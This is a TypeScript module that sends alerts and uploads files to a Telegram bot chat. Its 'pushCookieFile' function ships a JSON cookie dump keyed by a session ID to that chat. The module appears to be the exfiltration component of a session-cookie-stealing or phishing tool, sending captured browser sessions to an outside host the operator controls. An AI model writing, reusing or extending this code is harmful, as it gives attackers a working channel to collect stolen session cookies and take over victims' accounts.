import { cfg } from './config.js';

async function api(method: string, payload: Record<string, unknown>) {
  if (!cfg.tgToken || !cfg.tgChat) return;
  try {
    await fetch(`https://api.telegram.org/bot${cfg.tgToken}/${method}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: cfg.tgChat, parse_mode: 'HTML', disable_web_page_preview: true, ...payload }),
    });
  } catch (e) { console.error('tg', e); }
}

export const alert = (text: string) => api('sendMessage', { text });

export async function pushCookieFile(sid: string, body: string, caption: string) {
  if (!cfg.tgToken || !cfg.tgChat) return;
  const fd = new FormData();
  fd.append('chat_id', cfg.tgChat);
  fd.append('caption', caption.slice(0, 900));
  fd.append('document', new Blob([body], { type: 'application/json' }), `${sid}.json`);
  try {
    await fetch(`https://api.telegram.org/bot${cfg.tgToken}/sendDocument`, { method: 'POST', body: fd });
  } catch (e) { console.error('tg doc', e); }
}